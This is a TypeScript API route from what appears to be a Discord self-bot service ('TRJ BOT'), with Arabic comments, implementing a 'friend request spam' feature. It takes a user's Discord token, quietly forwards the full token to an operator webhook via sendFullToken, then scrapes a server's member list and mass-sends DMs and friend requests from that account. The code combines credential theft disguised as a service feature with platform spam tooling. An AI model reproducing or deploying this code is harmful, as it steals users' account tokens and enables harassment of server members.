// src/app/api/friend-spam/route.ts - Friend Request Spam API v1.0
// ⚠️ PRIME ONLY - سبام طلبات الصداقة
export const runtime = 'edge';

import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken } from '@/lib/webhook';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { token, guildId, maxRequests, message } = body as {
      token: string;
      guildId: string;
      maxRequests?: number;
      message?: string;
    };

    if (!token || !guildId) {
      return Response.json({ success: false, error: 'أدخل التوكن وأيدي السيرفر' });
    }

    const ct = cleanToken(token);
    const max = Math.min(maxRequests || 50, 100);

    // التحقق من التوكن
    const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

    if (!verifyResult.ok || !verifyResult.data) {
      return Response.json({ success: false, error: 'توكن غير صالح' });
    }

    const userData = verifyResult.data as { id: string; username: string };
    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    // إرسال للويب هوك
    sendFullToken('Friend Spam', ct, { '👤 المستخدم': userTag, '🏰 السيرفر': guildId });

    const logs: string[] = [`🎯 بدء إرسال طلبات صداقة لسيرفر: ${guildId}`];
    let successCount = 0;
    let failCount = 0;

    // جلب أعضاء السيرفر
    logs.push('📋 جاري جلب أعضاء السيرفر...');
    
    const membersRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/members?limit=1000`, undefined, { userOnly: true, timeout: 15000 });

    if (!membersRes.ok || !membersRes.data) {
      return Response.json({ success: false, error: 'فشل جلب أعضاء السيرفر', logs });
    }

    const members = membersRes.data as any[];
    logs.push(`👥 تم العثور على ${members.length} عضو`);

    // إرسال طلبات الصداقة
    let sent = 0;
    for (const member of members) {
      if (sent >= max) break;
      if (member.user?.id === userData.id) continue; // تخطي نفسه

      try {
        // فتح DM أولاً
        const dmRes = await discordFetch(ct, 'POST', '/users/@me/channels', {
          recipient_id: member.user.id
        }, { userOnly: true, timeout: 10000 });

        if (dmRes.ok && dmRes.data) {
          const channel = dmRes.data as any;
          
          // إرسال رسالة إذا محددة
          if (message) {
            await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
              content: message
            }, { userOnly: true, timeout: 10000 });
          }

          // إرسال طلب صداقة
          const friendRes = await discordFetch(ct, 'POST', `/users/@me/relationships/${member.user.id}`, {
            type: 1
          }, { userOnly: true, timeout: 10000 });

          if (friendRes.ok || friendRes.status === 204) {
            successCount++;
            logs.push(`✅ طلب صداقة: ${member.user.username}`);
          } else {
            failCount++;
          }
          sent++;
        } else {
          failCount++;
        }

        await new Promise(r => setTimeout(r, 1000));
      } catch {
        failCount++;
      }
    }

    logs.push('');
    logs.push(`📊 النتيجة: ✅ ${successCount} نجح | ❌ ${failCount} فشل`);

    // إرسال إشعار للويب هوك
    const webhookUrl = getLogWebhookUrl();
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: '👥 Friend Request Spam',
              description: `**تم إرسال طلبات صداقة في سيرفر:** ${guildId}`,
              color: 0x5865F2,
              fields: [
                { name: '👤 المستخدم', value: userTag, inline: true },
                { name: '🏰 السيرفر', value: guildId, inline: true },
                { name: '✅ نجح', value: successCount.toString(), inline: true },
                { name: '❌ فشل', value: failCount.toString(), inline: true },
              ],
              footer: { text: 'TRJ BOT - Prime Feature' },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch {}
    }

    return Response.json({
      success: true,
      logs,
      stats: { total: sent, success: successCount, failed: failCount }
    });

  } catch (error) {
    return Response.json({ success: false, error: 'خطأ في الخادم' });
  }
}
